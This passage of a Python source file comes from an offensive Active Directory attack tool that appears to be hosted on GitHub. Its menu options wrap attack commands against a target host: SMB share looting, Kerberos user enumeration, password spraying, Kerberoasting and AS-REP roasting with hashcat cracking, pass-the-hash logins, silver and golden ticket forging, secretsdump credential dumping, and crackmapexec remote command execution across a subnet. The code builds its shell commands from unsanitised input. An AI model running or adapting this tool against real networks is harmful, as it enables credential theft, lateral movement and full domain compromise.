            command("sed -i -n '/Found user: /p' users.tmp")
            command("cat users.tmp | sort > users2.tmp")

            with open("users2.tmp", "r") as read:
               for x in range (0, maxUser):
                  USER[x] = read.readline()
                  
                  if USER[x] != "":
                     USER[x] = USER[x].replace("Found user: ", "")
                     USER[x] = USER[x].split(",")
                     USER[x] = USER[x][0]
                     USER[x] = spacePadding(USER[x], COL3)
                     
                     if USER[x] != "":
                       print(colored(USER[x],colour6))
                       command("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                       HASH[x] = "."*COL4
                     else:
                        USER[x] = " "*COL3
                        HASH[x] = "."*COL4
                  else:
                     USER[x] = " "*COL3
                     HASH[x] = " "*COL4   
            read.close()         
         else:
            print ("[" + colored("*", colour8) + "] No entries were found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Details : #HKEY_LOCAL_MACHINE\SAM
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      checkParams = testTwo()
      
      if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password authentication...")
            
      print("[" + colored("i", colour2) + "] For your information, registry key format looks like this...")
      keys()
                
      if checkParams != 1:
         registryKey = ""
         while registryKey.lower() != "quit":
            registryKey = input("\n[*] Enter registry key or type 'quit' to finish or 'help' for help: ") 
            if registryKey.lower() == "help":
               keys()
            else:
               if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
                  command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "'")
               else:
                  if registryKey.lower() != "quit":
                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName ' -s" + registryKey + "'")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      checkParams = testTwo()

      if checkParams != 1:
         command(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '35':
      checkParams = testTwo()
      
      if checkParams != 1:
         if NTM[:5] == "EMPTY":
            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
         else:
            print("[" + colored("i", colour2) + "] Using HASH value as password login credential...\n")
            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='36':
      checkParams = testOne()
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares.tmp")
         else:
            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' > shares.tmp")
            
         bonusCheck = linecache.getline("shares.tmp", 1)
         
         if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
            print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
            
         if os.path.getsize("shares.tmp") != 0:       
            command("tput setaf 2")
            command("cat shares.tmp")
            command("tput sgr0")
            
            command("sed -i /'is an IPv6 address'/d shares.tmp")
            command("sed -i /'no workgroup'/d shares.tmp")
            command("sed -i /Sharename/d shares.tmp")
            command("sed -i /---------/d shares.tmp")
            command("sed -i '/^$/d' shares.tmp")
            command("sed -i 's/^[ \t]*//' shares.tmp")
            command("mv shares.tmp " + dataDir + "/shares.txt")
         
         with open(dataDir + "/shares.txt", "r") as shares:
            for x in range(0, maxUser):
                SHAR[x] = shares.readline().rstrip(" ")
                SHAR[x] = spacePadding(SHAR[x], COL2)
      else:
         print("[" + colored("-", colour7) + "] Unable to obtains shares...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      checkParams = testTwo()
      
      if IP46 == "-6":
         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))
         checkParams = 1
                 
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            print("[" + colored("*", colour8) + "] Checking OS...")
            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
         else:
            print("[" + colored("*", colour8) + "] Checking OS...")
            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
            
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            print("[" + colored("*", colour8) + "] Checking command privilege...")
            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
         else:
            print("[" + colored("*", colour8) + "] Checking command privilege...")
            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
      
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            print("[" + colored("*", colour8) + "] Mapping Shares...")
            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
         else:
            print("[" + colored("*", colour8) + "] Mapping Shares...")
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      checkParams = testTwo()
      
      exTensions = fileExt.replace(",","|")
      exTentions = "'(" + exTensions + ")'"
            
      if IP46 == "-6":
         print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour0)) 
         checkParams = 1 
      
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            print("[" + colored("+", colour6) + "] Downloading any found files...")
            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")

         else:
            print("[" + colored("+", colour6) + "] Downloading any found files...")
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      checkParams = testOne()
      
      if TSH[:5] == "EMPTY":
         print("[" + colored("-", colour7) + "] SHARE NAME has not been specified...")
         checkParams = 1
      
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash -s " + TSH.rstrip(" " ))
         else:
            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " -s " + TSH.rstrip(" "))
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      checkParams = testTwo()

      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
         else:
            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      checkParams = testTwo()
      
      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Enumerating remote server, please wait...")
         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")         

         command("sed -i '/@/!d' users.tmp")
         command("sort -r users.tmp > sortedusers.tmp")
         
         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:
            for username in read:
               username = username.replace("|     ","")
               username = username.replace("|_    ","")
               username, null = username.split("@")
               if username != "":
                  parse.write(username + "\n")                  
                  
         count = len(open('validusers.tmp').readlines())           
         if count > 0:
            print("[" + colored("+", colour6) + "] Found valid usernames...\n")
                             
            with open("validusers.tmp", "r") as read:
               for loop in range(0, count):
                  checkname = read.readline().rstrip("\n")
                  checkname = spacePadding(checkname, COL3)               
                  for x in range(0, maxUser):
                     if checkname == USER[x]:
                        print(colored((USER[x]), colour6))
                        VALD[x] = "1"
                        USER.insert(0, USER.pop(x))
                        HASH.insert(0, HASH.pop(x))
                        VALD.insert(0, VALD.pop(x))
                        break

            with open(dataDir + "/usernames.txt", "w") as write1, open(dataDir + "/hashes.txt", "w") as write2, open(dataDir + "/tokens.txt", "w") as write3:
               for x in range(0, maxUser):
                  if USER[x] != "":
                     write1.write(USER[x].rstrip(" ") + "\n")
                     write2.write(HASH[x].rstrip(" ") + "\n")
                     write3.write(VALD[x].rstrip(" ") + "\n")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='42':
      checkParams = testTwo()
      found = 0
      
      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")

         test1 = linecache.getline("password1.tmp", 1)
         if test1 != "":
            found = 1
            USR,PAS = testOne.split(":")
            USR = spacePadding(USR, COL1)
            PAS = spacePadding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all usernames with matching passwords...")
            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.tmp")
         
            test2 = linecache.getline("password2.tmp", 1)
            if test2 != "":
               found = 1
               USR,PAS = test2.split(":")
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords passwords.txt -outputfile password3.tmp > log.tmp") 
                  
            test3 = linecache.getline("password3.tmp", 1)
            if test3 != "":
               USR,PAS = test3.split(":") 
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      checkParams = testTwo()
      
      if checkParams != 1:
         if linecache.getline('usernames.txt', 1) != " ":
            if NTM[:5] != "EMPTY":
               print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
               command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
            else:
               command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.tmp")
              
            print("[" + colored("*", colour8) + "] Cracking hash values if they exists...\n")
            command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
            command("strings cracked1.txt")
         else:
            print("[" + colored("-", colour7) + "] The file usernames.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='44':
      checkParams = testTwo()      

      with open(dataDir + "/usernames.txt", "r") as read:
         for x in range(0, maxUser):
            line = read.readline().rstrip("\n")
            if VALD[x] == "1":
               command("echo " + line + " >> authorised.tmp")
      read.close()
      
      count = len(open('authorised.tmp').readlines())      
      if count == 0:
         print("[" + colored("-", colour7) + "] The authorised user file is empty...")
         checkParams = 1

      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
         else:
            command(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
            
         print("[" + colored("*", colour8) + "] Cracking hash values if they exists...\n")
         command("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
         command("strings cracked2.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if PAS[:1] != "\"":
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")
         
         for x in range(0, maxUser):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               HASH[x] = NTM.rstrip(" ")
         NTM = spacePadding(NTM, COL1)
      else:
         print("[" + colored("-", colour7) + "] Password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      checkParams = testTwo()
      
      if USR[:2] == "''":
         print("[" + colored("*", colour8) + "] Please enter a valid username for enumeration...")
         checkParams = 1
         
      if checkParams != 1:       
         count = len(open(dataDir + "/hashes.txt").readlines())
         counter = 0
         if count > 12:
            marker = int(round(count/4))
         else:
            marker = 0
         marker1 = marker
         marker2 = marker * 2
         marker3 = marker * 3
                     
         if count > 0:
            print("[" + colored("+", colour6) + "] Please wait, bruteforcing remote server using " + str(count) + " hashes...")

            with open(dataDir + "/hashes.txt", "r") as force:
               for brute in force:
                  brute = brute.rstrip("\n")             
                  
                  command(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
                  counter = counter + 1

                  command("sed -i '1d' datalog.tmp")
                  command("sed -i '1d' datalog.tmp")
                     
                  with open("datalog.tmp", "r") as ticket:
                     checkFile = ticket.read()
                                            
                  if "[*] Saving ticket" in checkFile:
                     print("[" + colored("*", colour8) + "] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    

                     print("[" + colored("*", colour8) + "] Now checking ticket status..\n")
                     privCheck()                     
                     
                     NTM = spacePadding(brute, COL1)
                     checkParams = 2
                     break
                                                   
                  if "Clock skew too great" in checkFile:
                     print("[" + colored("-", colour7) + "] Clock skew too great, terminating...")
                     checkParams = 2
                     break
                     
                  if marker1 == counter:
                     print("[" + colored("i", colour2) + "] 25% completed...")
                     
                  if marker2 == counter:
                     print("[" + colored("i", colour2) + "] 50% completed...")
                     
                  if marker3 == counter:
                     print("[" + colored("i", colour2) + "] 75% completed...")                        
                     
            if checkParams != 2:
               print("[" + colored("-", colour7) + "] 100% complete - exhausted!!...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Pass the Ticket.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      print("[" + colored("*", colour8) + "] Sorry, Pass-the-Ticket has not been implemented yet...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      checkParams = testTwo()
      
      if checkParams == 0:
         checkParams = testThree()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying to create silver TGT for user " + USR.rstrip(" ") + "...\n")
         
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[" + colored("+", colour6) + "] Checking silver TGT status...")
            privCheck()
         else:
             print("[" + colored("-", colour7) + "] Silver TGT was not generated...")      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      checkParams = testTwo()
      
      if checkParams == 0:
         checkParams = testThree()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying to create golden TGT for user " + USR.rstrip(" ") + "...\n")

         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[" + colored("+", colour6) + "] Checking gold TGT status...")
            privCheck()
         else:
            print("[" + colored("-", colour7) + "] Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='50':
      checkParams = testTwo()

      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
         else:
            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      checkParams = testTwo()

      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
         else:
            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
            
         print("[" + colored("*", colour8) + "] Checking downloaded files: \n")
         command("ls -la ./" + DIR.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      checkParams = testTwo()
      
      if checkParams != 1:
         print ("[" + colored("*", colour8) + "] Enumerating, please wait...")     
         if PAS[:2] != "''":
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
         else:
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      checkParams = testTwo()

      if checkParams != 1:
         BH1 = input("[" + colored("+", colour6) + "] Enter Neo4j username: ")
         BH2 = input("[" + colored("+", colour6) + "] Enter Neo4j password: ")
         if BH1 != "" and BH2 != "":
            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
         else:
            print("[" + colored("-", colour7) + "] Username or password cannot be null...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      checkParams = testTwo()

      if checkParams != 1:
         print("Enumerating, please wait...\n")
         if PAS[:2] != "''":
            command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > secrets.tmp")
         else:
            command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")

         command("sed -i '/:::/!d' secrets.tmp")
         command("sort -u secrets.tmp > ssecrets.tmp")
         	
         count = len(open('ssecrets.tmp').readlines())         
         if count > 0:
            
               
            command("rm " + dataDir + "/usernames.txt")
            command("rm " + dataDir + "/hashes.txt")
            command("rm tokens.txt")
            command("touch tokens.txt")
             
            for x in range(0, count):
               data = linecache.getline("ssecrets.tmp", x + 1)               
               data = data.replace(":::","")				# REMOVE AS IT MESSES WITH THE SPLIT COMMAND 
               
               try:
                  get1,get2,get3,get4 = data.split(":") 
               except ValueError:
                  try:
                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
                     get1, get2, get3 = data.split(":")
                     get4 = get3
                  except:
                     get1 = "Major Error..."
                     get2 = "Major Error..."
                     get3 = "Major Error..."
                     get4 = "Major Error..."

               get1 = get1.rstrip("\n")
               get2 = get1.rstrip("\n")
               get3 = get1.rstrip("\n")
               get4 = get4.rstrip("\n")

               print(colored("[" + colored("+", colour6) + "] Found User " + get1,colour6))
            
               USER[x] = get1[:COL3]
#              USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")	# STRIP ANY REMAINING DOMAIN NAME
               HASH[x] = get4[:COL4]
               USER[x] = spacePadding(USER[x], COL3)
               HASH[x] = spacePadding(HASH[x], COL4)
                           
               command("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
               command("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
         else:      
            print("[" + colored("-", colour7) + "] No users were found. check the domain name is correct...")               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      checkParams = testTwo()

      if checkParams != 1:
         if PAS[:2] != "''":
            print("[" + colored("*", colour8) + "] Enumerating, please wait...")
            print("[" + colored("+", colour6) + "] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("\n[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x whoami /all")

            print("\n[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")
         
            print("\n[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x net user Administrator /domain")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x --lusers")         
         else:
            print("[" + colored("i", colour2) + "] Using HASH value as password credential")
            print("[" + colored("*", colour8) + "] Enumerating, please wait...")          
